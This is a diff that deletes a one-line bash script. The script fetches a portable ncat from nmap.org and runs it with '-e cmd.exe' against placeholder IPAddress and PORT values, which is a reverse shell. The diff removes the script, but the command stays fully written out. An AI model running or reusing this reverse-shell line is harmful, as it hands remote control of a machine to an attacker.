@@ -1,2 +1,0 @@
-#!/bin/bash
-curl -L -o ncat-portable.zip https://nmap.org/dist/ncat-portable-5.59BETA1.zip && unzip -o ncat-portable.zip -d ncat-portable && mv ncat-portable/ncat.exe . && rm -rf ncat-portable ncat-portable.zip && ./ncat.exe IPAddress PORT -e cmd.exe
